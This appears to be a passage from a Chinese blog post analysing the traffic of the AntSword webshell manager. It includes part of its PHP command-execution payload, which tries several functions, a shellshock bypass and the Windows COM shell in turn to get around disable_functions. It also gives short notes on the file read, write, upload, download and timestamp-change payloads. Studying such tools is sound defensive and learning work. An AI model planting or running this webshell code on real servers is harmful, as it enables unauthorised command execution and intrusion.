                    print (@fgets($fp, 2048));
                }
                @pclose($fp);
            } elseif (fe('proc_open')) {
                $p = @proc_open($c, array(
                    1 => array(
                        'pipe',
                        'w'
                    ) ,
                    2 => array(
                        'pipe',
                        'w'
                    )
                ) , $io);
                while (!@feof($io[1])) {
                    print (@fgets($io[1], 2048));
                }
                while (!@feof($io[2])) {
                    print (@fgets($io[2], 2048));
                }
                @fclose($io[1]);
                @fclose($io[2]);
                @proc_close($p);
            } elseif (fe('antsystem')) {
                @antsystem($c);
            } elseif (runshellshock($d, $c)) {
                return $ret;
            } elseif (substr($d, 0, 1) != "/" && @class_exists("COM")) {
                $w = new COM('WScript.shell');
                $e = $w->exec($c);
                $so = $e->StdOut();
                $ret.= $so->ReadAll();
                $se = $e->StdErr();
                $ret.= $se->ReadAll();
                print ($ret);
            } else {
                $ret = 127;
            }
            return $ret;
        };
        $ret = @runcmd($r . " 2>&1");
        print ($ret != 0) ? "ret={$ret}" : "";;
    }
    catch(Exception $e) {
        echo "ERROR://" . $e->getMessage();
    };
    asoutput();
    die();
    ?>
数据包里面两个都是base64，第一个参数是cmd（linux为/bin/sh），执行的命令是dir,第二个参数是cd /d
“D:\phpstudy_pro\WWW”&dir&echo [S]&cd&echo [E]，cd到这个目录下面去执行dir
上面就是设置一些变量吧，第一个if判断当前为什么系统，不同系统添加不同环境变量，尝试了一下发现这样添加环境变量是临时的，
第二个if也没看懂是做什么用的
fe函数检测函数有无被禁用
$d得到被禁用的函数，变为一个数组，如果$d为空也转换成一个数组，如果$d不为空先将所有的禁用函数转换为小写再去掉空格
如果这个函数存在，可调用，不在这个数组里面则返回true
runshellshock函数，这里已经开始bypass_disable_function了，但是这里需要C语言的知识，暂时还不会C语言所以没法读
runcmd函数，就是一个个对比过去了system,passthru,shell_exec,exec,popen,proc_open,antsystem,runshellshock最后还有个com组件
antsystem这个方法找了一下没找到，可能是作者先留着准备以后写的吧
$ret是命令执行后返回的状态，0是成功1是失败
上面所有方法都不能使用则返回ret=127，实际测试中只有所有方法都失败了才会返回127，因为里面执行的命令不止有一条，如：cd /d
“D:\phpstudy_pro\WWW”&a&echo [S]&cd&echo [E]只要错误的命令不在最后一段里面就会返回0
    whoami&a&whoami                #返回0
    whoami&whoami&a                #返回1
如果想看到ret=1输入;就可以，会使整条命令都错误
## 0x05 读文件流量
    getMessage();
    };
    asoutput();
    die(); ?>
这个就普通的读文件，POST上去的文件路径使用base64编码。，如果filesize没读出大小默认文件大小为4096
## 0x06 写文件+保存文件流量
    getMessage();
    };
    asoutput();
    die();
    ?>
写入内容和文件路径使用base64编码，fwrite写入
## 0x07 上传文件流量
    getMessage();
    };
    asoutput();
    die();
    ?>
第一个参数是文件路径，第二个参数是上传文件内容
不知道$c为什么要替换两次
然后计算出上传文件长度通过for循环上传
## 0x08 下载文件流量
    getMessage();
    };
    asoutput();
    die(); 
    ?>
第一个参数是下载的文件，如果有使用魔术引号需要把斜杆都去除，没有的话就直接返回，后面这个fgetc也看不太懂，可能也涉及C语言的知识，以后学懂了再来看。
## 0x09 更改时间流量
这个就只是好奇想看一看是怎么改的
    getMessage();
    };
    asoutput();
    die();
    ?>
两个参数一个是文件路径一个是需要修改的时间
和上面一样判断有无魔术引号
touch方法修改文件时间
## 0x10 总结
看了一下蚁剑编码器和解码器，基本上也是一样的，就是代码加个编码返回值也加个编码
写这个就是看一看蚁剑的数据包吧，顺便还可以学一下php